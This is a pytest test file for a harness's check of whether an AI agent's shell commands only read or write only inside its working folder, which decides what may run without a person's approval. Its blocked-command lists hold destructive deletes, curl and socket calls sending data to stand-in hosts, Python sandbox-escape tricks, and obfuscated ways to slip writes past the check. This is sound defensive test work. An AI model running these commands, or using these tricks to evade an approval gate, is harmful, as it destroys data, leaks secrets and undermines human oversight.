"""Whether a call of a framework's own shell only reads (``governance.shell.read_only``): what
the harness lets Claude Code and Kimi Code run without asking a person; and, given a working
folder, whether its every write lands there (``approvable``: the benchmark's reviewer)."""

from __future__ import annotations

import importlib.util
import inspect

import pytest

from trellis.harness.governance import shell
from trellis.harness.governance.shell import approvable, read_only


def py(code: str) -> str:
    """``code`` as the Python a shell command runs (a heredoc: no quoting to read through)."""
    return f"python3 - <<'EOF'\n{code}\nEOF"


READS = [
    "cat /data/sales.csv | head -50",
    "wc -l sales.csv && head -3 sales.csv",
    "grep -c denim sales.csv; sort -t, -k3 -n sales.csv | tail -5",
    "awk -F, '{s+=$4} END {print s}' sales.csv",
    "sed -n '2,10p' sales.csv",
    "find . -name '*.csv'",
    """python3 -c "import csv; print(sum(float(r['revenue']) for r in csv.DictReader(open('s.csv'))))\"""",
    "python3 - <<'EOF'\nimport pandas as pd\ndf = pd.read_csv('s.csv')\nprint(df['revenue'].sum())\nEOF",
    "python3 <<EOF\nwith open('s.csv', 'rb') as f:\n    print(len(f.read()))\nEOF",
    # Kimi's, in the re-measure on Haiku: a newline inside the quoted code, an error output
    # joined to the output (``2>&1``), ``which``
    'python3 -c "\nr=25333.51\nn=r*0.9*1.15\nprint(round(n,2), round(n-r,2))"',
    'python3 -c "import matplotlib, sys; print(matplotlib.__version__, sys.version)" 2>&1; which python3',
    'python3 -c "import matplotlib; print(matplotlib.__version__)" 2>&1; which python3; pwd; ls -la',
    "ls -la 2>&1 | head -5",
    # Kimi's, run with the fixes: an error output thrown away
    "which gnuplot convert magick 2>/dev/null; pwd",
    "ls -la x > /dev/null && echo found",
    # Kimi's, in the natural re-measure: a cd first (into any folder: nothing is written)
    "cd /srv/kimi/cwd && ls -l /large_tool_results/3dfef05 && head -3 s.csv && wc -l s.csv",
    # Claude's, on the long set: a string's replace is no file's (os.replace, Path.replace)
    "cd /srv/claude/tool-results && python3 -c \"\nimport json\nt=json.load(open('a.json'))[0]['text']\n"
    "print('tail:', t[10:310].replace(chr(10),' ')[:300])\n\"",
    """python3 -c "name = 'Trail Sandal'; print(name.replace(' ', '_'))\"""",
    """python3 -c "print(open('s.csv').read().replace(',', ';', 3))\"""",
    """python3 -c "v = 'a b'; d = {}; d['k'] = v; print(d['k'].replace(' ', '_'))\"""",
    # what the proof still reads: the listed modules by their listed names, a value's listed methods
    py(
        "import os, sys, glob\nfor f in sorted(glob.glob('*.csv')):\n    print(f, os.path.getsize(f))"
    ),
    py("from os import path\nfrom os.path import join as j\nprint(path.exists(j('a', 'b')))"),
    py("import os.path as osp, numpy.linalg\nprint(osp.isdir('.'), numpy.linalg.norm([3, 4]))"),
    py("import os.path\nprint(os.path.basename('a/b'), os.sep)"),
    py(
        "import json, re, math, statistics, datetime, collections, itertools, csv, string, textwrap"
    ),
    py(
        "from pathlib import Path\nfor q in Path('.').glob('*.csv'):\n    print(q.name, q.stat().st_size)"
    ),
    py("from pathlib import Path\nprint(Path('a.txt').open().read(), Path('b').open(mode='rb'))"),
    py(
        "import pandas as pd\npd.set_option('display.max_columns', None)\n"
        "df = pd.read_csv('s.csv')\nprint(df.head().to_string(), df.describe().to_markdown(index=False))"
    ),
    py(
        "import pandas as pd\ndf = pd.read_csv(open('s.csv'))\ng = df.groupby('region')\n"
        "print(g.agg({'revenue': ['sum', 'mean']}), g.agg(total=('revenue', 'sum'), n=('units', len)))"
    ),
    py(
        "import pandas as pd, numpy as np\ndf = pd.read_excel('s.xlsx')\ndef band(v):\n    return v // 10\n"
        "print(df['units'].apply(band), df['units'].apply(lambda v: v * 2), df.agg(np.mean), df.agg(max))"
    ),
    py("from numpy import mean\nimport pandas as pd\nprint(pd.read_csv('s.csv').agg(mean))"),
    py(
        "import numpy as np\na = np.loadtxt('s.txt')\nprint(a.mean(), np.percentile(a, 90), a.shape)"
    ),
    py(
        "from collections import Counter\nfrom datetime import datetime\n"
        "c = Counter(open('s.csv').read().split())\nprint(c.most_common(3), datetime.now().isoformat())"
    ),
    py(
        "import json\nd = json.load(open('a.json'))\nprint(type(d), f'{type(d)}', type(d).__name__, len(d))"
    ),
    py(
        "import io, gzip\nprint(io.open('a.txt', 'r').read(), gzip.open('a.gz', 'rt', encoding='utf-8').read())"
    ),
    py("import matplotlib\nprint(matplotlib.__version__, __name__, matplotlib.__doc__)"),
    py(
        "import openpyxl\nws = openpyxl.load_workbook('q3.xlsx').active\n"
        "for row in ws.iter_rows(values_only=True):\n    print(row)"
    ),
    py(
        "class Total:\n    def add(self, v):\n        self.value = v\n        return self\n"
        "try:\n    print(Total().add(1).value)\nexcept ValueError as e:\n    print(e.args)"
    ),
    # the shell: sed and awk that only print, a comment, an option among others that writes nothing
    "sed -n -e '1p' -e '$p' s.csv",
    "sed -ne '/denim/p;5q' s.csv",
    "sed -E 's/[0-9]+/N/g; s|a|b|2' s.csv",
    "awk -F , -v n=3 'NR <= n {print $1}' s.csv",
    "sort -t, -k2,2nr s.csv | uniq -c | sort -rn",
    "/usr/bin/wc -l s.csv",
    "echo a#b  # a comment",
    """grep "total$" s.csv | cut -d, -f2 ; echo a\\ b "it's \\$5" '{$x}' "{a,b}" $""",
]
NOT = [
    "rm -rf /tmp/x",
    "cat a.csv > b.csv",
    "echo hi >> notes.txt",
    "sort -o out.csv in.csv",
    "sed -i 's/a/b/' sales.csv",
    "sed 's/a/b/w out.txt' sales.csv",
    "find . -name '*.csv' -delete",
    "find . -exec rm {} ;",
    "awk '{print > \"out.txt\"}' s.csv",
    "curl https://example.com",
    "pip install statsmodels",
    "python3 forecast.py",
    "python3 -c \"import pandas as pd; pd.read_csv('s.csv').to_excel('q3.xlsx')\"",
    "python3 -c \"open('out.txt', 'w').write('x')\"",
    "python3 -c \"import subprocess; subprocess.run(['ls'])\"",
    "python3 -c \"import os; os.remove('s.csv')\"",
    # a replace that moves a file: os's (by any name the module has), a Path's (one argument)
    "python3 -c \"import os; os.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os as o; o.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os; o = os; p = o; p.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os\nif (o := os):\n    o.replace('s.csv', 'old.csv')\"",
    "python3 -c \"import os, sys; sys.modules['os'].replace('s.csv', 'old.csv')\"",
    "python3 -c \"from os import replace; replace('s.csv', 'old.csv')\"",
    "python3 -c \"from pathlib import Path; Path('s.csv').replace('old.csv')\"",
    "python3 -c \"from pathlib import Path; p = Path('s.csv'); p.replace(target='old.csv')\"",
    "python3 -c 'import matplotlib.pyplot as plt; plt.savefig(\"c.png\")'",
    "python3 -c 'syntax error('",
    "cat $(ls)",
    "cat `ls`",
    "sleep 100 &",
    "X=1 cat s.csv",
    "cat 's.csv",
    "",
    "cat s.csv\nrm s.csv",  # a newline between commands: the second one is read too
    "ls 2>&1 > out.txt",
    "ls 2>errors.txt",
    "which python3 > where.txt",
    "ls 2>/dev/null.txt",
    "ls > /dev/sda",
    "cat <<'EOF'\nhello\nEOF",  # a heredoc to anything but Python is not read here
    "cd /data && rm sales.csv",
    "cd && ls",
    # ---- a function that writes, reached without calling it by its name (all read-only on main)
    py("import os\nf = os.remove\nf('s.csv')"),
    py("from os import remove as r\nr('s.csv')"),
    py("import os\ngetattr(os, 'remove')('s.csv')"),
    py("import os\ngetattr(os, 're' + 'move')('s.csv')"),
    py("from pathlib import Path\nu = Path.unlink\nu(Path('s.csv'))"),
    py("import os\n{'x': os.remove}['x']('s.csv')"),
    py("import os\nlist(map(os.remove, ['s.csv']))"),
    # ---- a module held another way, its replace (a file's move) read as a text's (PR #208's)
    py("import os\n(lambda m: m.replace('s.csv', 'old.csv'))(os)"),
    py("import os\ndef f(m):\n    m.replace('s.csv', 'old.csv')\nf(os)"),
    py("import os\nfor m in [os]:\n    m.replace('s.csv', 'old.csv')"),
    py("import os\nm, n = os, 1\nm.replace('s.csv', 'old.csv')"),
    py("import os\nclass K:\n    m = os\nK.m.replace('s.csv', 'old.csv')"),
    py("import os\nd = {'m': os}\nd['m'].replace('s.csv', 'old.csv')"),
    py("import os\nglobals()['os'].replace('s.csv', 'old.csv')"),
    py("from pathlib import Path\np = Path('s.csv')\ntype(p).replace(p, 'old.csv')"),
    py("import glob\n(lambda m: m.replace('s.csv', 'old.csv'))(glob.os)"),
    # ---- further ways round: each writes, moves, deletes, runs a program or sends
    py("import os\nos.renames('s.csv', 'old.csv')"),  # a writer main's list of names never had
    py("import os\nos.execv('/bin/rm', ['rm', 's.csv'])"),
    py("import os\nos.open('s.csv', flags=os.O_WRONLY | os.O_TRUNC)"),
    py("import os\nos.environ['MPLBACKEND'] = 'module://x'"),
    py("import os\nos.chdir('/etc')"),
    py("from os import *\nremove('s.csv')"),
    py("from . import os"),
    py("import os as o, os.path as o"),
    py("import os\nfrom os import path as os"),
    py("from os import path\nfrom os.path import join as path"),
    py("from os.path import join\nfrom os import path as join"),
    py("from os.path import join\nfrom os.path import split as join"),
    py("import os\nx = os.path\nprint(x.os.remove('s.csv'))"),
    py("import os\nos.path.os.remove('s.csv')"),
    py("import os\nos.path.exists = print"),
    py("import os\nos.sep = '!'"),
    py("import json\njson.codecs.open('s.csv', 'w')"),
    py("import statistics\nstatistics.sys.modules['os'].remove('s.csv')"),
    py("import sys\nsys.modules['os'].remove('s.csv')"),
    py("import sys\nsys.path.insert(0, '/tmp/x')\nimport json"),
    py("import builtins\nbuiltins.open('s.csv', 'w')"),
    py("import importlib\nimportlib.import_module('os').remove('s.csv')"),
    py("import ctypes\nctypes.CDLL(None).unlink(b's.csv')"),
    py("import operator\noperator.attrgetter('remove')"),
    py("import operator, os\noperator.methodcaller('remove', 's.csv')(os)"),
    py("import string\nstring.Formatter().get_field('0.gi_frame', [(x for x in [])], {})"),
    py("import pickle\npickle.load(open('x.pkl', 'rb'))"),
    py("import zipfile\nzipfile.ZipFile('s.csv', 'w')"),
    py("import sqlite3\nsqlite3.connect('new.db')"),
    py("import shelve\nshelve.open('s')"),
    py("import webbrowser\nwebbrowser.open('http://x/?q=secret')"),
    py("import antigravity"),
    py("import tempfile\ntempfile.mkstemp()"),
    py("import logging\nlogging.basicConfig(filename='s.csv', filemode='w')"),
    py("import fileinput\nfor line in fileinput.input('s.csv', inplace=True):\n    pass"),
    py("import socket\nsocket.create_connection(('x', 80)).send(b'secret')"),
    py("import urllib.request\nurllib.request.urlopen('http://x/?q=secret')"),
    py("import asyncio\nasyncio.run(asyncio.create_subprocess_exec('rm', 's.csv'))"),
    py("import multiprocessing\nmultiprocessing.Process(target=print).start()"),
    py("import re\nre.compile('x')"),  # as on main
    py(
        "xs = [1]\nxs.remove(1)\nys = xs.copy()"
    ),  # as on main: the names a file's delete and copy have
    py("print(__builtins__.open)"),
    py("for __builtins__ in []:\n    pass"),
    py("print(__loader__, __spec__)"),
    py("print(().__class__.__base__.__subclasses__())"),
    py("f = lambda: 0\nprint(f.__globals__['__builtins__'])"),
    py("print((x for x in []).gi_frame.f_builtins['exec'])"),
    py("try:\n    1 / 0\nexcept Exception as e:\n    print(e.__traceback__.tb_frame.f_globals)"),
    py("print('{0.__class__}'.format(1)._formatter_parser())"),
    py("print(vars()['x'])"),
    py("print(locals(), dir())"),
    py("eval('1')"),
    py("exec('import os')"),
    py("__import__('os').remove('s.csv')"),
    py("compile('1', 'f', 'eval')"),
    py("x = input()"),
    py("breakpoint()"),
    py("print(undefined_name)"),
    # a built-in's name the code sets later is still the built-in until then
    py("eval('1')\neval = 1"),
    py("getattr(1, 'real')\ndef getattr(a, b):\n    return 0"),
    py("x = vars\nfor vars in []:\n    pass"),
    py("import json as getattr"),
    py("from json import loads as exec"),
    # open: kept, passed, or given its mode a way the text does not show
    py("o = open\no('s.csv', 'w')"),
    py("list(map(open, ['s.csv'], ['w']))"),
    py("import functools\nfunctools.partial(open, mode='w')('s.csv')"),
    py("open(*['s.csv', 'w'])"),
    py("open('s.csv', **{'mode': 'w'})"),
    py("m = 'w'\nopen('s.csv', m)"),
    py("open('s.csv', 'r+')"),
    py("open('s.csv', 'a')"),
    py("open(file='s.csv', mode='w')"),
    py("open('s.csv', 'r', -1, None, None, None, True, print)"),
    py("open('s.csv', opener=print)"),
    py("from pathlib import Path\nPath('s.csv').open('w')"),
    py("from pathlib import Path\nPath('s.csv').open(mode='w')"),
    py("from pathlib import Path\nPath.open(Path('s.csv'), 'w')"),
    py("import io\nio.open('s.csv', 'w')"),
    py("from io import open as o\no('s.csv', 'w')"),
    py("import io\nio.FileIO('s.csv', 'w')"),
    py(
        "print(type(open('a', 'rb', buffering=0))('s.csv', 'w'))"
    ),  # the class of a raw file opens one
    py("t = type(1)"),
    py("print = lambda c: c('s.csv', 'w')\nprint(type(open('a', 'rb', buffering=0)))"),
    py("print(type(1, 2))"),
    py("print(type(*[1]))"),
    # a text's replace, when the code could hold a Path - or keeps the method
    py("from pathlib import Path\nPath.replace(Path('s.csv'), 'old.csv')"),
    py("import pathlib\npathlib.Path.replace(pathlib.Path('s.csv'), 'old.csv')"),
    py(
        "from pathlib import Path\nprint(Path('a b').name.replace(' ', '_'))"
    ),  # the cost: not proven
    py("from pathlib import Path as P\nq = P\nq.replace(q('s.csv'), 'old.csv')"),
    py("from pathlib import PurePath\nr = str.replace\nr('a', 'b', 'c')"),
    py("r = 'a b'.replace\nprint(r(' ', '_'))"),
    py("print('a b'.replace(*[' ', '_']))"),
    py("print('a b'.replace(' ', '_', count=1))"),
    py("import datetime\nprint(datetime.date.today().replace(day=1))"),  # as on main
    # a Path's other writes, a table's and an array's, with and without the name main knew
    py("from pathlib import Path\nPath('a').symlink_to('b')"),
    py("from pathlib import Path\nPath('a').hardlink_to('b')"),
    py("from pathlib import Path\nprint(Path('a').parser.os.remove)"),
    py("from pathlib import Path\nPath('s.csv').write_text('x')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_hdf('s.h5', key='k')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_string('out.txt')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_markdown(buf='out.md')"),
    py("import pandas as pd\nf = pd.read_csv('s.csv').to_string\nf('out.txt')"),
    py("import pandas as pd\npd.read_csv('s.csv').to_clipboard()"),
    py("import pandas as pd\npd.read_csv('s.csv').agg('to_csv', 0, 'out.csv')"),
    py("import pandas as pd\nf = 'to_csv'\npd.read_csv('s.csv').agg(f, 0, 'out.csv')"),
    py("import pandas as pd\npd.read_csv('s.csv').apply('to_pickle', args=('x.pkl',))"),
    py("import pandas as pd\npd.read_csv('s.csv').agg(['sum', 'to_csv'])"),
    py("import pandas as pd\npd.read_csv('s.csv').agg({'a': 'to_csv'})"),
    py("import pandas as pd\npd.read_csv('s.csv').groupby('a').agg(x=('b', 'to_csv'))"),
    py("import pandas as pd\npd.read_csv('s.csv').agg()"),
    py("import pandas as pd\npd.read_csv('s.csv').agg(*['to_csv'])"),
    py("import pandas as pd\nlen = 'to_csv'\npd.read_csv('s.csv').agg(len, 0, 'out.csv')"),
    py(
        "import pandas as pd\ndef f(v):\n    return v\nf = 'to_csv'\npd.read_csv('s.csv').agg(f, 0, 'o.csv')"
    ),
    py(
        "import pandas as pd\ndef name(g):\n    return 'to_csv'\n@name\ndef f(v):\n    return v\n"
        "pd.read_csv('s.csv').agg(f, 0, 'o.csv')"
    ),
    py("\uff45\uff56\uff41\uff4c('1')"),  # wide letters: Python reads them as eval
    "python -c \"execfile('x.py'); execfile = 1\"",  # Python 2's built-in, where python is one
    py("import pandas as pd\nprint(pd.read_csv('s.csv').query('@os.remove(\"s.csv\")'))"),
    py("import pandas as pd\npd.eval('1')"),
    py("import pandas as pd\npd.io.common.os.remove('s.csv')"),
    py("import pandas as pd\npd.read_pickle('x.pkl')"),
    py("import pandas as pd\npd.read_csv('https://x/?q=secret')"),
    py("import pandas as pd\nu = 'https://x/?q=secret'\npd.read_csv(u)"),
    py("import pandas as pd\npd.read_csv()"),
    py("import pandas as pd\nr = pd.read_csv\nr('https://x/?q=secret')"),
    py("from pandas import read_csv as r\nx = r\nx('https://x/?q=secret')"),
    py("import pandas as pd\nopen = lambda: 'https://x/?q=secret'\npd.read_csv(open())"),
    py("import pandas as pd\npd.set_option('display.x|plotting.backend', 'antigravity')"),
    py("import pandas as pd\npd.set_option('plotting.backend', 'antigravity')"),
    py("import pandas as pd\npd.set_option(**{'pat': 'plotting.backend', 'value': 'x'})"),
    py("import pandas as pd\npd.read_csv('s.csv').plot(backend='antigravity')"),
    py(
        "import pandas as pd\npd.read_csv('s.csv').plot()"
    ),  # draws: of use only to save, in the folder
    py(
        "import pandas as pd\npd.read_csv('s.csv').hist(None, None, True, None, None, None, None, None, "
        "False, False, None, None, 10, 'antigravity')"
    ),
    py(
        "import pandas as pd\nprint(pd.read_csv('s.csv').revenue)"
    ),  # the cost: a column read as an attribute
    py("import numpy as np\nnp.array([1]).tofile('s.csv')"),
    py("import numpy as np\nnp.savetxt('s.csv', [1])"),
    py("import numpy as np\nnp.load('x.npy', allow_pickle=True)"),
    py("import numpy as np\nnp.loadtxt('https://x/s.txt')"),
    py("import numpy as np\nprint(np.array([1]).ctypes.data)"),
    py("import numpy as np\nnp.memmap('s.csv', mode='w+', shape=(1,))"),
    py("import matplotlib\nmatplotlib.use('module://antigravity')"),
    py("import matplotlib\nmatplotlib.use('Agg', force=True)"),
    py("import matplotlib\nmatplotlib.rcParams['backend'] = 'module://antigravity'"),
    py("import matplotlib.pyplot as plt\nplt.plot([1])"),
    py("from matplotlib import pyplot"),
    py("import openpyxl\nopenpyxl.Workbook(write_only=True)"),
    py("import openpyxl\nopenpyxl.Workbook(True)"),
    py("import yaml\nyaml.load(open('a.yaml'), Loader=yaml.Loader)"),
    py("import json, sys\njson.dump({}, sys.stdout)"),  # a write to a handle: as on main
    py("import sys\nsys.stdout.write('x')"),
    py("import csv, sys\nw = csv.writer(sys.stdout).writerow\nprint(w.__self__)"),
    py("match 1:\n    case int(real=r):\n        print(r)"),
    py("def f(**k):\n    return k\nf(**{'a': 1})"),
    py("print(x := 1, y)"),
    py("import os\n[m.replace('s.csv', 'old.csv') for m in (os,)]"),
    py("import os\n(m for m in [os])"),
    py("import os\ndef f(m=os):\n    return m.replace('s.csv', 'old.csv')"),
    py("import os\n@os\ndef f():\n    pass"),
    py("import os\nwith os as m:\n    pass"),
    py("import os\nif (m := os):\n    pass"),
    py("import os\n*m, = [os]"),
    py("import os\nprint(f'{os.remove}')"),
    py("import os\nprint(f'{os!r:>{os.replace}}')"),
    py("import os\nos = 1"),
    py("import os\ndef os():\n    pass"),
    py("import os\ntry:\n    pass\nexcept Exception as os:\n    pass"),
    py("import os\ndel os"),
    py("import os\nf = lambda os: os.listdir('.')"),
    py("import os\nclass os:\n    pass"),
    py("import os\nos.listdir(b'.')[0].decode().__class__"),
    # ---- the shell: read another way by the shell than by the check (all read-only on main)
    "echo a#b ; rm x",  # no comment mid-word: the shell runs the rm
    "echo $'\\'' ; rm x ; echo \\'",  # $'...' ends where shlex reads on
    'echo $"hi"',
    'python3 <<EOF\nprint("$(rm x)")\nEOF',  # an unquoted heredoc: the shell expands it first
    "python3 <<EOF\nprint('`rm x`')\nEOF",
    "python3 <<EOF\na = '\\\\'; b = ' ;import os;os.remove(\"x\") #'\nEOF",  # and drops a backslash
    "python3 <<'EOF'\nEOF = reboot = 0\nEOF\nreboot\nEOF",  # the body ends at the first EOF
    "./python3 <<'EOF'\nprint(1)\nEOF",
    "sort {-o,out.csv} in.csv",  # the shell makes the braces two words: -o out.csv
    "echo -delete ; find . $_",  # the last word of the command before: find . -delete
    """echo "';import os;os.remove('s.csv');'" ; python3 -c "x = '$_'\"""",
    'cat "$HOME/s.csv"',
    "cat ${HOME}/s.csv",
    "echo $[1+1] $1 $@ $? $$",
    "./cat s.csv",  # a file of the folder, named as a reader
    "bin/ls",
    # sed, awk and the readers: an option or a command main read past
    "sed -ni 's/a/b/' s.csv",
    "sed -Ei 's/a/b/' s.csv",
    "sed --in-place 's/a/b/' s.csv",
    "sed 's/a/b/gw out.txt' s.csv",
    "sed -n '1w out.txt' s.csv",
    "sed 's|a|b|e' s.csv",
    "sed -n -e p -e 'w out.txt' s.csv",
    "sed -f script.sed s.csv",
    "sed -n s.csv -e",
    "sed -n",
    "sed '1e rm x' s.csv",
    "awk 'BEGIN{system (\"rm x\")}'",
    "awk -i inplace '{print}' s.csv",
    "awk -f prog.awk s.csv",
    "awk 'BEGIN{getline x < \"/inet/tcp/0/x/80\"}'",
    "awk '@include \"x\"'",
    "awk '{print | \"sh\"}' s.csv",
    "sort -no out.csv in.csv",
    "sort --compress-program=rm s.csv",
    "uniq in.csv out.csv",
    "rg --pre rm x",
    "rg -uz total logs",  # runs a program to unpack what it searches
    "file -z a.gz",
    "file -C -m magic",
    "date -s 2020-01-01",
    # programs that are no readers, and the shell's own ways to run one
    "find . -fprintf out.txt %p",
    "xargs rm",
    "cat s.csv | tee out.csv",
    "dd if=a of=b",
    "env X=1 rm x",
    "sh -c 'rm x'",
    "bash -c 'rm x'",
    "perl -e 'unlink \"x\"'",
    'node -e \'require("fs").unlinkSync("x")\'',
    "ruby -e 'File.delete(\"x\")'",
    "git clean -fd",
    "git checkout -- s.csv",
    "curl -X POST -d @s.csv https://example.com",
    "curl -o page.html https://example.com",
    "wget https://example.com",
    "tar -xf a.tar",
    "unzip a.zip",
    "chmod 777 s.csv",
    "ln -s a b",
    "(rm x)",
    "cat <(rm x)",
    "ls |& tee x",
    "echo x >& out.txt",
    "cat <<< x",
    "eval rm x",
    "exec rm x",
    "command rm x",
    "time rm x",
]


@pytest.mark.parametrize("command", READS)
def test_a_command_that_only_reads_is_approved(command: str) -> None:
    assert read_only("Bash", {"command": command})


@pytest.mark.parametrize("command", NOT)
def test_a_command_that_may_write_or_cannot_be_read_stays_a_pause(command: str) -> None:
    assert not read_only("Bash", {"command": command})


def test_only_a_shell_call_is_read_here() -> None:
    assert not read_only("Write", {"command": "cat s.csv", "file_path": "x"})
    assert not read_only("Bash", {})


# --------------------------------------------------------------------------- writes in the run's folder
#: What Kimi and Claude ran to save the file a user asked for (the Haiku re-measure), each
#: writing only inside the run's own working folder (``{w}``): approved, as a user would.
SAVES = [
    "mkdir -p exports && python3 -c \"import pandas as pd; pd.DataFrame().to_excel('exports/q3.xlsx')\"",
    "cd {w} && python3 - <<'EOF'\nfrom openpyxl import Workbook\nwb = Workbook()\nwb.save('denim_q3.xlsx')\nEOF",
    "cp /large_tool_results/3dfef05 {w}/S14_sales_2026.csv && wc -l {w}/S14_sales_2026.csv",
    "python3 -c \"import matplotlib.pyplot as plt; plt.plot([1, 2]); plt.savefig('chart.png')\"",
    "python3 -c \"from pathlib import Path; Path('notes.md').write_text('# Q3')\"",
    "python3 -c \"import json; json.dump({{'a': 1}}, open('out/a.json', 'w'))\"",
    "echo done > status.txt",
    "python3 -c \"import os; os.makedirs('out', exist_ok=True); os.mkdir('out/a')\"",
    "python3 -c \"from pathlib import Path; Path('exports').mkdir(parents=True); Path('a.txt').touch()\"",
    "python3 -c \"import pathlib; pathlib.Path('notes.md').open('w').write('# Q3')\"",
    "python3 - <<'EOF'\nwith open('a.txt', 'w', encoding='utf-8') as f:\n    f.write('x')\nEOF",
    "python3 -c \"import sys; m = 'a'; open('log.txt', m).writelines(['x']); sys.stdout.write('ok')\"",
    "python3 -c \"import numpy as np; np.save('a.npy', np.arange(3))\"",
    "python3 - <<'EOF'\nimport matplotlib\nmatplotlib.use('Agg')\nimport matplotlib.pyplot as plt\n"
    "import pandas as pd\nax = pd.read_csv('s.csv').plot(kind='bar')\nax.set_title('Q3')\n"
    "ax.figure.savefig('c.png')\nplt.close()\nEOF",
]
#: Writing outside it, deleting, moving, a path not written out, installing, the network: a pause.
OUTSIDE = [
    "cp a.csv /tmp/a.csv",
    "echo hi > ../outside.txt",
    "mkdir -p /etc/trellis",
    "cd /tmp && touch x",
    "cd .. && touch x",
    "rm q3.xlsx",
    "mv a.csv b.csv",
    "cp -f a.csv b.csv",
    "touch link/x",  # a link inside the folder to a folder outside it
    "python3 -c \"p = 'c.png'; import matplotlib.pyplot as plt; plt.savefig(p)\"",
    "python3 -c \"import os; os.remove('q3.xlsx')\"",
    "python3 -c \"open('/etc/passwd', 'w').write('x')\"",
    "python3 -c \"import shutil; shutil.copy('a', 'b')\"",
    # the path a Path is made with, not what is written to it
    "python3 -c \"from pathlib import Path; Path('/etc/motd').write_text('notes.md')\"",
    "pip install openpyxl",
    "curl -o page.html https://example.com",
    # the Path that is written: not a variable's, a second part's, another function's of that name
    # (the first two were approved on main: the content was read as the path)
    "python3 -c \"from pathlib import Path; p = Path('/etc/motd'); p.write_text('notes.md')\"",
    "python3 -c \"from pathlib import Path as P; q = P; q('/etc/motd').write_text('notes.md')\"",
    "python3 -c \"from pathlib import Path; Path('ok', '/etc/motd').write_text('x')\"",
    "python3 -c \"from pathlib import Path; Path('ok', x=1).write_text('x')\"",
    "python3 -c \"from pathlib import Path; (Path('a') / '../../etc/motd').write_text('x')\"",
    "python3 -c \"from pathlib import Path; Path.write_text(Path('/etc/motd'), 'notes.md')\"",
    "python3 - <<'EOF'\nfrom pathlib import Path as P\ndef Path(x):\n    return P('/etc/motd')\n"
    "Path('notes.md').write_text('x')\nEOF",
    "python3 -c \"from pathlib import Path; p = Path('/etc/motd'); p.open('w')\"",
    "python3 -c \"open('a.txt', 'w', -1, None, None, None, True, print)\"",
    "python3 -c \"open('a.txt', 'w', opener=print)\"",
    "python3 -c \"import json; json.dump({}, open('/etc/x.json', 'w'))\"",
    "python3 -c \"import numpy as np; np.arange(3).dump('/etc/x.pkl')\"",
    "python3 -c \"import pandas as pd; pd.DataFrame().to_csv(*['/etc/x.csv'])\"",
    'python3 -c "import pandas as pd; pd.DataFrame().to_csv()"',
    "python3 -c \"import os; os.chdir('/etc'); open('x', 'w')\"",
    "python3 -c \"import matplotlib.pyplot as plt; plt.savefig('c.png', backend='module://x')\"",
    "python3 -c \"import matplotlib.pyplot as plt; plt.title('t', usetex=True); plt.savefig('c.png')\"",
    "python3 -c \"import matplotlib.pyplot as plt; s = plt.savefig; s('/etc/c.png')\"",
]


@pytest.mark.parametrize("command", SAVES)
def test_a_save_inside_the_runs_folder_is_approved(command: str, tmp_path) -> None:
    command = command.format(w=tmp_path)
    assert approvable("Bash", {"command": command}, tmp_path)
    assert not read_only("Bash", {"command": command})  # without the folder: still a pause


@pytest.mark.parametrize("command", OUTSIDE)
def test_a_write_outside_the_folder_a_delete_or_a_move_stays_a_pause(
    command: str, tmp_path
) -> None:
    (tmp_path / "link").symlink_to("/tmp")
    assert not approvable("Bash", {"command": command}, tmp_path)


def test_a_frameworks_own_file_tool_is_approved_inside_the_folder_only(tmp_path) -> None:
    assert approvable("Write", {"file_path": str(tmp_path / "report.md")}, tmp_path)
    assert approvable("Write", {"path": "exports/report.md"}, tmp_path)  # Kimi's, relative
    assert not approvable("Write", {"file_path": "/tmp/report.md"}, tmp_path)
    assert not approvable("Write", {"file_path": str(tmp_path / "report.md")})


# --------------------------------------------------------------------------- what the lists promise
#: The names main refused wherever they were called (its ``PY_WRITES``).
REFUSED = {
    *("write", "writelines", "write_text", "write_bytes", "to_csv", "to_excel", "to_parquet"),
    *(
        "to_json",
        "to_pickle",
        "to_sql",
        "to_feather",
        "savefig",
        "save",
        "dump",
        "remove",
        "unlink",
    ),
    *("rmdir", "removedirs", "rmtree", "mkdir", "makedirs", "touch", "rename", "replace", "move"),
    *("copy", "copyfile", "copytree", "chmod", "chown", "truncate", "symlink", "link", "system"),
    *("popen", "run", "call", "check_call", "check_output", "Popen", "kill", "exec", "eval"),
    *("compile", "__import__"),
}


def _listed() -> list[tuple[str, str, object]]:
    """Each listed name of each listed module that is installed here, and what it names."""
    found = []
    for module, names in shell.PY_MODULES.items():
        if importlib.util.find_spec(module.split(".")[0]) is not None:
            found += [(module, n, getattr(importlib.import_module(module), n, None)) for n in names]
    return found


def test_no_name_main_refused_is_read_only_now() -> None:
    """Nothing is looser than it was: a name main refused is still refused, or is one checked
    where it is called (a save inside the folder, a write to a handle, a text's replace)."""
    listed = {name for names in shell.PY_MODULES.values() for name in names}
    assert not REFUSED & shell.PY_METHODS
    assert REFUSED & listed <= shell.PY_SAVES | shell.PY_HANDLES
    assert not REFUSED & shell.PY_BUILTINS


def test_a_listed_name_is_there_and_is_no_module() -> None:
    """A module is reached only as a listed module: no listed name of one is itself a module
    (``glob.os``), and each is there (no name listed by mistake)."""
    for module, name, value in _listed():
        assert value is not None, f"{module}.{name}"
        assert not inspect.ismodule(value), f"{module}.{name}"


def test_no_listed_method_of_a_listed_value_is_a_module() -> None:
    """Nor does a listed class or function give a module back by a listed attribute."""
    for module, name, value in _listed():
        for method in shell.PY_METHODS:
            assert not inspect.ismodule(getattr(value, method, None)), f"{module}.{name}.{method}"
